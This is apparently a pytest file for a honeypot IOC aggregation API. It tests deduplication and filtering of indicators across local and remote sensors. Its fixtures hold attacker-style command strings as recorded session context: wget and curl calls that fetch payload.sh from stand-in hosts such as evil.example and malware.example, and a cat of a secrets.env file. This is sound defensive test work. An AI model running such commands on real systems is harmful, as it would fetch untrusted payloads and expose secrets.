"""Tests for the aggregated IOC knowledge-base API."""

import json

from fastapi.testclient import TestClient

from api.app import create_app


def _analysis(session_id, sensor_id, timestamp, indicators):
    return {
        "event_id": f"analysis-{session_id}",
        "event_type": "morpheus.intelligence.analysis",
        "source": "morpheus",
        "timestamp": timestamp,
        "data": {
            "honeypot_id": sensor_id,
            "session": {
                "session_id": session_id,
                "source_ip": "192.0.2.10",
                "commands": [],
            },
            "risk_assessment": {"score": 10, "severity": "low"},
            "indicators_of_compromise": indicators,
        },
    }


def _ioc(value, kind="domain", context=None):
    return {
        "value": value,
        "ioc_type": kind,
        "source": "cowrie",
        "confidence": 1.0,
        "context": context or [],
    }


def _client(tmp_path, local_events, remote_events=None):
    local_path = tmp_path / "local.jsonl"
    remote_path = tmp_path / "remote.jsonl"
    local_path.write_text(
        "".join(json.dumps(event) + "\n" for event in local_events),
        encoding="utf-8",
    )
    remote_path.write_text(
        "".join(json.dumps(event) + "\n" for event in (remote_events or [])),
        encoding="utf-8",
    )
    return TestClient(
        create_app(
            storage_path=str(local_path),
            sensor_storage_path=str(remote_path),
        )
    )


def test_ioc_api_deduplicates_across_local_and_remote_sensors(tmp_path):
    client = _client(
        tmp_path,
        [
            _analysis(
                "session-local",
                "sensor-a",
                "2026-11-01T10:00:00Z",
                [_ioc("evil.example", context=["wget evil.example"])],
            )
        ],
        [
            _analysis(
                "session-remote",
                "sensor-b",
                "2026-11-02T10:00:00Z",
                [_ioc("EVIL.EXAMPLE", context=["curl EVIL.EXAMPLE"])],
            )
        ],
    )

    response = client.get("/api/v1/iocs")

    assert response.status_code == 200
    body = response.json()
    assert body["total_unique"] == 1
    assert body["total_matching"] == 1
    item = body["items"][0]
    assert item["value"] == "evil.example"
    assert set(item["session_ids"]) == {"session-local", "session-remote"}
    assert set(item["honeypot_ids"]) == {"sensor-a", "sensor-b"}
    assert item["occurrences"] == 2
    assert len(item["context"]) == 2


def test_ioc_api_filters_by_type_and_search(tmp_path):
    client = _client(
        tmp_path,
        [
            _analysis(
                "session-1",
                "sensor-a",
                "2026-11-01T10:00:00Z",
                [
                    _ioc("evil.example", "domain"),
                    _ioc("http://evil.example/dropper", "url"),
                ],
            )
        ],
    )

    response = client.get("/api/v1/iocs?ioc_type=url&q=dropper")

    assert response.status_code == 200
    body = response.json()
    assert body["total_matching"] == 1
    assert body["items"][0]["value"] == "http://evil.example/dropper"


def test_ioc_api_filters_by_honeypot(tmp_path):
    client = _client(
        tmp_path,
        [
            _analysis(
                "session-a",
                "sensor-a",
                "2026-11-01T10:00:00Z",
                [_ioc("one.example")],
            ),
            _analysis(
                "session-b",
                "sensor-b",
                "2026-11-02T10:00:00Z",
                [_ioc("two.example")],
            ),
        ],
    )

    response = client.get("/api/v1/iocs?honeypot_id=sensor-b")

    assert response.status_code == 200
    assert [item["value"] for item in response.json()["items"]] == [
        "two.example"
    ]



def test_ioc_api_reconstructs_iocs_from_historical_commands(tmp_path):
    event = _analysis(
        "legacy-session",
        "sensor-a",
        "2026-11-01T10:00:00Z",
        [],
    )
    event["data"]["session"]["commands"] = [
        "wget http://malware.example/payload.sh"
    ]

    client = _client(tmp_path, [event])
    response = client.get("/api/v1/iocs")

    assert response.status_code == 200
    body = response.json()
    assert any(
        item["value"] == "http://malware.example/payload.sh"
        and item["ioc_type"] == "url"
        and "legacy-session" in item["session_ids"]
        for item in body["items"]
    )

def test_ioc_api_returns_empty_result_for_historical_events_without_iocs(tmp_path):
    client = _client(
        tmp_path,
        [
            _analysis(
                "old-session",
                "sensor-a",
                "2026-11-01T10:00:00Z",
                [],
            )
        ],
    )

    response = client.get("/api/v1/iocs")

    assert response.status_code == 200
    assert response.json()["items"] == []
    assert response.json()["total_unique"] == 0

def test_ioc_api_filters_historical_filename_but_keeps_url_hostname(tmp_path):
    client = _client(
        tmp_path,
        [
            _analysis(
                "historical-session",
                "sensor-a",
                "2026-11-09T10:00:00Z",
                [
                    _ioc(
                        "secrets.env",
                        context=["cat /opt/company/secrets.env"],
                    ),
                    _ioc(
                        "evil.example",
                        context=["wget http://evil.example/payload.sh"],
                    ),
                ],
            )
        ],
    )

    response = client.get("/api/v1/iocs")

    assert response.status_code == 200
    body = response.json()
    assert [item["value"] for item in body["items"]] == ["evil.example"]
    assert body["total_unique"] == 1
